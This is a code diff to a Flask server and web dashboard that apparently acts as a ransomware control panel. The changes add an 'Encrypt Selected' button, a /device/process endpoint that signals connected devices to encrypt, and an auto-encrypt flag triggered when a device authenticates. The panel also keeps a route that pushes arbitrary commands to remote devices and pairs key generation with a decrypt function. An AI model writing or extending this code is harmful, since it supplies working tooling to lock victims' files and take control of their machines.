@@ -44,7 +44,7 @@ DEVICES = {}
 SCRIPTS = {
     'scriptA': {
         'label': 'Script A (agent_sync from Downloads)',
-        'command': 'python "C:\\Users\\user\\Downloads\\sample\\py_simple\\agent_sync.py"'
+        'command': 'python "C:\\Users\\user\\Downloads\\sample\\py_simple\\agent_sync.py" --auto-encrypt'
     },
     'scriptB': {
         'label': 'Script B (c sample)',
@@ -144,7 +144,8 @@ def py_simple_ui():
                     <span class=\"label\">Devices</span>
                     <select id=\"deviceSel\"></select>
                     <button class=\"btn ghost\" id=\"refreshBtn\">Refresh</button>
-                    <button class=\"btn primary\" id=\"decryptBtn\">Decrypt Selected</button>
+                              <button class=\"btn\" id=\"encryptBtn\">Encrypt Selected</button>
+                              <button class=\"btn primary\" id=\"decryptBtn\">Decrypt Selected</button>
                 </div>
                 <div id=\"devMeta\" class=\"kv\"></div>
             </div>
@@ -203,6 +204,7 @@ def py_simple_ui():
                 pub: document.getElementById('pub'), prv: document.getElementById('prv'),
                 devPub: document.getElementById('devPub'), devPrv: document.getElementById('devPrv'),
                 scriptSel: document.getElementById('scriptSel'), run: document.getElementById('runBtn'),
+                         enc: document.getElementById('encryptBtn'),
             };
 
             function setStatus(msg) { els.status.textContent = msg; }
@@ -268,6 +270,16 @@ def py_simple_ui():
                 catch (e) { setStatus('Decrypt failed: ' + e.message); }
             }
 
+            async function encryptSelected() {
+                const tok = currentToken(); if (!tok) return setStatus('Select a device first');
+                try {
+                    els.enc.disabled = true; els.enc.textContent = 'Encrypting…';
+                    const data = await fetchJSON(apiBase + '/device/process', { method: 'POST', body: JSON.stringify({ token: tok }) });
+                    setStatus(data.status || 'Encrypt signal sent');
+                } catch (e) { setStatus('Encrypt failed: ' + e.message); }
+                finally { els.enc.disabled = false; els.enc.textContent = 'Encrypt Selected'; }
+            }
+
             async function generateKeys() {
                 try {
                     const data = await fetchJSON(apiBase + '/keys/rsa', { method: 'POST', body: JSON.stringify({}) });
@@ -292,13 +304,16 @@ def py_simple_ui():
                 const script = scripts.find(x => x.id === id);
                 if (!script || !script.command) return setStatus('Script has no command');
                 try {
+                    els.run.disabled = true; els.run.textContent = 'Running…';
                     await fetchJSON(apiBase + '/device/run', { method: 'POST', body: JSON.stringify({ token: tok, command: script.command }) });
                     setStatus('Run command sent');
                 } catch (e) { setStatus('Run failed: ' + e.message); }
+                finally { els.run.disabled = false; els.run.textContent = 'Run'; }
             }
 
             els.refresh.addEventListener('click', loadDevices);
             els.decrypt.addEventListener('click', decryptSelected);
+                els.enc.addEventListener('click', encryptSelected);
             els.gen.addEventListener('click', generateKeys);
             els.attach.addEventListener('click', attachKeys);
             els.sel.addEventListener('change', renderDevices);
@@ -330,27 +345,6 @@ def keys_aes():
     except Exception as e:
         return jsonify({'error': 'aes_keygen_failed', 'message': str(e)}), 500
 
-@app.route('/py_simple/keys/aes', methods=['POST'])
-def keys_aes_prefixed():
-    return keys_aes()
-
-@app.route('/keys/aes/private', methods=['POST'])
-def keys_aes_private():
-    admin = os.getenv('ADMIN_TOKEN', 'secretfr')
-    provided = request.headers.get('X-ADMIN-TOKEN') or request.args.get('token')
-    if not admin or provided != admin:
-        return jsonify({'error': 'forbidden', 'message': 'Admin token required'}), 403
-    try:
-        key = os.urandom(32)
-        b64 = base64.b64encode(key).decode()
-        return jsonify({'algorithm': 'AES-256-GCM', 'key_base64': b64})
-    except Exception as e:
-        return jsonify({'error': 'aes_keygen_failed', 'message': str(e)}), 500
-
-@app.route('/py_simple/keys/aes/private', methods=['POST'])
-def keys_aes_private_prefixed():
-    return keys_aes_private()
-
 @app.route('/keys/rsa', methods=['POST'])
 def keys_rsa():
     try:
@@ -374,7 +368,11 @@ def keys_rsa():
         data = request.get_json(silent=True) or {}
         provided_hostname = data.get('hostname')
 
-        record = {'timestamp': int(__import__('time').time()), 'requester_ip': requester_ip, 'requester_hostname': provided_hostname}
+        record = {
+            'timestamp': int(__import__('time').time()),
+            'requester_ip': requester_ip,
+            'requester_hostname': provided_hostname,
+        }
         try:
             with open('last_key_request.json', 'w', encoding='utf-8') as f:
                 json.dump(record, f, indent=2)
@@ -497,12 +495,26 @@ def publickey_register():
         requester_ip = (forwarded.split(',')[0].strip() if forwarded else request.remote_addr) or ''
         data = request.get_json(silent=True) or {}
         provided_hostname = data.get('hostname')
+        request_auto = bool((data or {}).get('auto_encrypt'))
 
-        # Create a device token; by default do NOT trigger encryption on auth
-        import secrets
-        token = secrets.token_hex(16)
-        auto = (os.getenv('AUTO_ENCRYPT_ON_AUTH') or '0').strip().lower() in ('1','true','yes','on')
-        DEVICES[token] = { 'sid': None, 'connected': False, 'pending_encrypt': bool(auto), 'ip': requester_ip, 'hostname': provided_hostname }
+        # Reuse an existing token for the same host to avoid duplicates in UI
+        token = None
+        if provided_hostname:
+            for t, info in list(DEVICES.items()):
+                if (info.get('hostname') == provided_hostname) and (not info.get('sid') or info.get('connected')):
+                    token = t
+                    break
+        if not token:
+            import secrets
+            token = secrets.token_hex(16)
+            auto = request_auto or ((os.getenv('AUTO_ENCRYPT_ON_AUTH') or '0').strip().lower() in ('1','true','yes','on'))
+            DEVICES[token] = { 'sid': None, 'connected': False, 'pending_encrypt': bool(auto) }
+        # Always keep latest meta
+        DEVICES[token]['ip'] = requester_ip
+        DEVICES[token]['hostname'] = provided_hostname
+        # If auto requested on an existing token, mark pending
+        if request_auto:
+            DEVICES[token]['pending_encrypt'] = True
 
         record = {'timestamp': int(__import__('time').time()), 'requester_ip': requester_ip, 'requester_hostname': provided_hostname}
         try:
@@ -896,3 +908,26 @@ def device_run():
 @app.route('/py_simple/device/run', methods=['POST'])
 def device_run_prefixed():
     return device_run()
+
+@app.route('/device/process', methods=['POST'])
+def device_process():
+    """Signal a specific connected device to start processing (encrypt).
+
+    Body: { token: str }
+    """
+    try:
+        payload = request.get_json(force=True)
+        token = (payload or {}).get('token')
+        if not token:
+            return jsonify({'error': 'bad_request', 'message': 'token required'}), 400
+        info = DEVICES.get(token)
+        if not info or not info.get('connected') or not info.get('sid'):
+            return jsonify({'error': 'offline', 'message': 'device not connected'}), 400
+        socketio.emit('process', to=info['sid'])
+        return jsonify({'status': 'Encrypt signal sent', 'token': token})
+    except Exception as e:
+        return jsonify({'error': 'process_failed', 'message': str(e)}), 500
+
+@app.route('/py_simple/device/process', methods=['POST'])
+def device_process_prefixed():
+    return device_process()
